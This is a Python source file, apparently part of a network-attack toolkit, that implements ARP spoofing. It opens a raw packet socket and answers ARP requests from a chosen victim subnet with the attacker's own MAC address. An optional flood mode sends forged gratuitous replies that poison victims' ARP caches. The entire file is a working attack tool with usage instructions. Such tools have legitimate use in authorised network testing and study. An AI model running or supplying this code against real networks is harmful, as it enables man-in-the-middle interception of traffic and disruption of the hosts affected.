"""ARP Spoofing.

Usage:

	python3 -m agave.arp.spoof <target: subnet|ip> [<victim: subnet|ip>] [-f]

"""
import socket, sys
from agave.core.helpers import execute, flood, MessageRaw
from agave.core.arp import ARP, OPERATION_REQUEST
from agave.core.ethernet import Ethernet, ETHER_TYPE_ARP, MACAddress
from agave.nic.interfaces import NetworkInterface
from .utils import create_filter, _parse
from .resolve import resolve
from ipaddress import IPv4Address, IPv4Network
from typing import Callable


def build_process(
	sock: "socket.socket",
	_filter: Callable[[ARP], bool],
	mac: MACAddress,
) -> Callable[[MessageRaw], str]:
	"""
	"""
	def fn(message: MessageRaw):
		_, arp = _parse(message[0])
		if _filter(arp):
			sock.sendto(
				arp.reply(mac.address),
				(message[1][0], message[1][1])
			)
		return None
	return fn


if __name__ == "__main__":

	try:
		# Parses arguments
		a = IPv4Network(sys.argv[1])
		b = None
		gratuitous = False
		interface = NetworkInterface.get_by_host(a.network_address)
		if len(sys.argv) > 2:
			b = IPv4Network(sys.argv[2])
		if len(sys.argv) > 3 and sys.argv[3] == "-f":
			if b.num_addresses > 0xff:
				print("[WARNING] Subnet is too large to send gratuitous replies.")
			else:
				print("[INFO] Flood gratuitous is enabled.")
				gratuitous = True
		# ARP Spoofing
		sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETHER_TYPE_ARP))
		_filter = create_filter(OPERATION_REQUEST, sender=b, target=a)
		process = build_process(sock, _filter, interface.mac)
		repeat = lambda: True
		# Builds gratuitous replies
		if gratuitous is True:
			addr = (interface.name, ETHER_TYPE_ARP)
			messages = []
			for sender in a.hosts():
				for target in b.hosts():
					t_mac = resolve(interface, target, sock=sock)
					if t_mac is None:
						print(
							"[WARNING] Couldn't resolve MAC for {}. This host "
							"won't be flooded with gratuitous replies.".format(target)
						)
					else:
						messages.append((ARP.is_at(interface.mac.address, sender, t_mac.address, target), addr))
			repeat = flood(sock, messages)
		# Running
		print("[INFO] Running...")
		for i in execute(sock, process, repeat):
			pass

	except KeyboardInterrupt:
		pass
	except BaseException as e:
		print(__doc__)
		print(f"[ERROR] {e}")

